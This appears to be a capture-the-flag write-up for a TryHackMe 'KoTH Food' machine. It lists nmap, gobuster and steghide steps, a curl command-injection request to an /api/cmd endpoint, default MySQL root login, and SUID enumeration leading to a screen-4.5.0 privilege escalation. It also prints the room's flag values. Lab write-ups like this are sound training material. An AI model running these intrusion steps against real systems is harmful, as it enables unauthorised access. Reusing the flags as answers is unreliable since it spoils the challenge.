> KoTH Food CTF | Get the 8 flags

**export IP=10.10.111.210**

# Nmap

sudo nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
3306/tcp open  mysql   syn-ack ttl 63 MySQL 5.7.29-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.29-0ubuntu0.18.04.1
9999/tcp open  abyss?  syn-ack ttl 63
15065/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
16109/tcp open  unknown syn-ack ttl 63
46969/tcp open  telnet  syn-ack ttl 63 Linux telnetd\
```

In port 16109, we got an image and on running steghide we got `creds.txt`. 
```
pasta:pastaisdynamic
```

We can SSH using these credentials and in bread's home, we got a flag.

## In http://10.10.111.210:15065/monitor/main.js we have an user `Steve` and we have obfuscated code

And on opening developer tools, we find it makes a request to /api/cmd.

curl 10.10.111.210:15065/api/cmd -X POST -d "ls -la"

# Flag 1
```
thm{7baf5aa8491a4b7b1c2d231a24aec575}
```

# Gobuster

sudo gobuster -u http://10.10.111.210:15065/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -o gobuster/initial -t 20 -x txt,php,zip,tar,sql,7z

```
/monitor
```

## Note : In port 15065, we have a username `dan`.

# Mysql

We can login using basic credentials `root:root`

mysql -h $IP -u root -p
```
show databses;
use users;
show tables;
select * from User;
```

And we have credentials `ramen:noodlesRTheBest`

# Flag 2

```
thm{2f30841ff8d9646845295135adda8332}
```

# Telnet

telnet 10.10.111.210 46969

```
Trying 10.10.111.210...
Connected to 10.10.111.210.
Escape character is '^]'.
tccr:uwjsasqccywsg => Looks like caesar
foodctf login: 
```

We got credentials `food:givemecookies`

And SSH using these creds. we have a `.flag` file 

# Flag 3

```
thm{58a3cb46855af54d0660b34fd20a04c1}
``` 

# Privilege Escalation

find / -perm -u=s -type f 2>/dev/null

```
/bin/ping
/bin/su
/bin/umount
/bin/mount
/bin/fusermount
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/at
/usr/bin/vim.basic
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/screen-4.5.0 => Looks like an exploit
/usr/bin/chfn
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/telnetlogin
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/snap/core/7270/bin/mount
/snap/core/7270/bin/ping
/snap/core/7270/bin/ping6
/snap/core/7270/bin/su
/snap/core/7270/bin/umount
/snap/core/7270/usr/bin/chfn
/snap/core/7270/usr/bin/chsh
/snap/core/7270/usr/bin/gpasswd
/snap/core/7270/usr/bin/newgrp
/snap/core/7270/usr/bin/passwd
/snap/core/7270/usr/bin/sudo
/snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7270/usr/lib/openssh/ssh-keysign
/snap/core/7270/usr/lib/snapd/snap-confine
/snap/core/7270/usr/sbin/pppd
/snap/core/8689/bin/mount
/snap/core/8689/bin/ping
/snap/core/8689/bin/ping6
/snap/core/8689/bin/su
/snap/core/8689/bin/umount
/snap/core/8689/usr/bin/chfn
/snap/core/8689/usr/bin/chsh
/snap/core/8689/usr/bin/gpasswd
/snap/core/8689/usr/bin/newgrp
/snap/core/8689/usr/bin/passwd
/snap/core/8689/usr/bin/sudo
/snap/core/8689/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8689/usr/lib/openssh/ssh-keysign
/snap/core/8689/usr/lib/snapd/snap-confine
/snap/core/8689/usr/sbin/pppd
```

And on searching in searchsploit, we got a script. Running it we got root access.

# Flag 4

```
thm{9f1ee18d3021d135b03b943cc58f34db}
```

And we have another flag in /var

# Flag 5

```
thm{0c48608136e6f8c86aecdb5d4c3d7ba8}
```

And in `tryhackme` directory we have flag7.

# Flag 7

```
thm{5a926ab5d3561e976f4ae5a7e2d034fe}
```